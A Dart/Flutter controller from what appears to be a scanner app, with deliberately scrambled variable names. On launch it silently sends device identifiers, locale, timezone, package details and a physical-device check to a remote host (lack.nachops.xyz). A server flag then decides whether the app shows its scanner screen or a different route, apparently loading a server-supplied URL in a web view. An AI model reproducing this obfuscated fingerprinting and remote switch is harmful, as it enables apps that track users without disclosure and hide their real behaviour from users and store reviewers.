import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var dbxrtflgzk = RxBool(false);
  var nvwxlpfyk = RxBool(true);
  var glqe = RxString("");
  var lou = RxBool(false);
  var zieme = RxBool(true);
  final cmjsdon = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    knle();
  }


  Future<void> knle() async {

    lou.value = true;
    zieme.value = true;
    nvwxlpfyk.value = false;

    cmjsdon.post("https://lack.nachops.xyz/clseawqudmkrxp",data: await njbfouz()).then((value) {
      var rhdjwum = value.data["rhdjwum"] as String;
      var bjzx = value.data["bjzx"] as bool;
      if (bjzx) {
        glqe.value = rhdjwum;
        phyllis();
      } else {
        metz();
      }
    }).catchError((e) {
      nvwxlpfyk.value = true;
      zieme.value = true;
      lou.value = false;
    });
  }

  Future<Map<String, dynamic>> njbfouz() async {
    final DeviceInfoPlugin sqdbrfy = DeviceInfoPlugin();
    PackageInfo imasfwko_jauwyfr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bgvpxu = Platform.localeName;
    var lxvsg = currentTimeZone;

    var wrnsefmb = imasfwko_jauwyfr.packageName;
    var gasckxho = imasfwko_jauwyfr.version;
    var gjwucnyq = imasfwko_jauwyfr.buildNumber;

    var kflbqodw = imasfwko_jauwyfr.appName;
    var keonKonopelski = "";
    var ntezj  = "";
    var zbwupa = "";
    var marisolDavis = "";
    var darioKessler = "";
    var dseb = "";

    var kfxsomew = "";
    var aslgzmut = false;

    if (GetPlatform.isAndroid) {
      dseb = "android";
      var tbdmgxz = await sqdbrfy.androidInfo;

      zbwupa = tbdmgxz.brand;

      kfxsomew  = tbdmgxz.model;
      ntezj = tbdmgxz.id;

      aslgzmut = tbdmgxz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dseb = "ios";
      var cbsofg = await sqdbrfy.iosInfo;
      zbwupa = cbsofg.name;
      kfxsomew = cbsofg.model;

      ntezj = cbsofg.identifierForVendor ?? "";
      aslgzmut  = cbsofg.isPhysicalDevice;
    }
    var res = {
      "darioKessler" : darioKessler,
      "gjwucnyq": gjwucnyq,
      "dseb": dseb,
      "gasckxho": gasckxho,
      "wrnsefmb": wrnsefmb,
      "keonKonopelski" : keonKonopelski,
      "kfxsomew": kfxsomew,
      "lxvsg": lxvsg,
      "zbwupa": zbwupa,
      "ntezj": ntezj,
      "bgvpxu": bgvpxu,
      "aslgzmut": aslgzmut,
      "marisolDavis" : marisolDavis,
      "kflbqodw": kflbqodw,

    };
    return res;
  }

  Future<void> metz() async {
    Get.offAllNamed("/scanner_main");
  }

  Future<void> phyllis() async {
    Get.offAllNamed("/scan_edit");
  }

}
